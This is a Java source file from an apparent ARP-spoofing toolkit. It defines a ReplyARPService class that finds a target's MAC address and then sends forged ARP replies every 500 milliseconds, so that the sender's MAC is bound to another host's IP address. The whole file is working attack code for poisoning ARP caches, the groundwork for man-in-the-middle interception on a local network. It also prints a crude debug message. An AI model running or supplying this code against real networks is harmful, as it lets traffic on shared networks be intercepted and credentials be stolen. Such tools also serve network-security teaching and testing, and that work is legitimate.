package org.bitducks.spoofing.services;

import java.net.InetAddress;
import java.util.Arrays;

import jpcap.packet.ARPPacket;

import org.bitducks.spoofing.core.InterfaceInfo;
import org.bitducks.spoofing.core.Server;
import org.bitducks.spoofing.core.Service;
import org.bitducks.spoofing.packet.PacketFactory;

public class ReplyARPService extends Service {
	private InetAddress target;
	private byte[] targetMAC;
	private InetAddress host;
	private InterfaceInfo infoInterface;
	
	public ReplyARPService(InetAddress target, InetAddress host) {
		super();
		this.target = target;
		this.host = host;
		infoInterface = Server.getInstance().getInfo();
	}
	
	@Override
	public void run() {
		System.out.println("MOFOS!");
		MacFindService finderTarget = new MacFindService(target);
		Server.getInstance().addService(finderTarget);
		System.out.println("FinderTarget added");
		targetMAC = finderTarget.getMacAddress();
		System.out.println(Arrays.toString(targetMAC));
		
		while(! this.isCloseRequested()){
			replySpoof();
			
			//Waiting 500ms to be sure we don't use all the CPU
			try {
				Thread.sleep(500);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
	}
	
	public void replySpoof() {
		ARPPacket spoofedPacket = PacketFactory.arpReply(infoInterface.getMacAddress(), host, targetMAC, target);
		logger.info("Sending a spoofed ARP reply to " + target);
		Server.getInstance().sendPacket(spoofedPacket);
	}

}
